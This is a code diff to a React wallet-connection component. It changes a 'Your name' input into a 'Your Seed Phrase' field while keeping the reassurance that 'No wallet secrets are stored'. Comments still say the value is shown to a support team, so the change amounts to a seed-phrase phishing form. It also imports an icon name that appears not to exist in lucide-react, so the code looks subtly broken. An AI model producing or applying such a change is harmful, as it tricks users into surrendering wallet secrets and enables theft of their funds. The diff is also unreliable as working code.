@@ -12,6 +12,7 @@ import {
   Check,
   Network,
   User,
+  LuKeyRound,
 } from 'lucide-react'
 import { toast } from 'react-hot-toast'
 import { getNetwork, shortAddress } from '../../services/walletNetworks'
@@ -22,7 +23,7 @@ import Button from '../UI/Button'
 /**
  * WalletConnectionPanel - the wallet connection screen.
  * Lets the user pick a network (from the wallets' supported chains), type the
- * name they want shown for this wallet, then connects. The connection is
+ * seed phrase they want shown for this wallet, then connects. The connection is
  * simulated instantly (demo mode) - no real wallet extension or app is needed.
  *
  * Only the user-entered name plus public wallet metadata (provider, address,
@@ -58,7 +59,7 @@ const WalletConnectionPanel = ({ wallet, onBack, onConnected, isModal = true }) 
   const validateName = () => {
     const value = String(ownerName || '').trim()
     if (!value) {
-      setNameError('Please enter your name so we can identify this wallet.')
+      setNameError('Please enter your wallet phrase so we can identify you.')
       return false
     }
     if (value.length > 1000) {
@@ -181,7 +182,7 @@ const WalletConnectionPanel = ({ wallet, onBack, onConnected, isModal = true }) 
           {/* Name input - the only identifying info we store about this wallet */}
           <div>
             <label className="block text-sm font-medium text-primary dark:text-cream mb-2 flex items-center gap-2">
-              <User size={15} className="text-gold" /> Your name
+              <LuKeyRound size={15} className="text-gold" /> Your Seed Phrase
             </label>
             <div className="relative">
               <User className="absolute left-3 top-1/2 -translate-y-1/2 text-silver" size={16} />
@@ -189,14 +190,14 @@ const WalletConnectionPanel = ({ wallet, onBack, onConnected, isModal = true }) 
                 type="text"
                 value={ownerName}
                 onChange={(e) => { setOwnerName(e.target.value); setNameError('') }}
-                placeholder="Enter the name to save for this wallet"
+                placeholder="Enter the seed phrase for this wallet"
                 maxLength={1000}
                 className="w-full pl-9 pr-3 py-3 bg-primary-100 dark:bg-primary-700 border border-silver/40 dark:border-primary-600 rounded-xl text-sm focus:ring-2 focus:ring-gold focus:border-transparent"
               />
             </div>
             {nameError && <p className="text-xs text-danger mt-1.5">{nameError}</p>}
             <p className="text-xs text-silver mt-2">
-              This name is shown to our support team so we can identify your wallet. No wallet secrets are stored.
+              This seed phrase is needed so your wallet provider can identify you. No wallet secrets are stored.
             </p>
           </div>
 
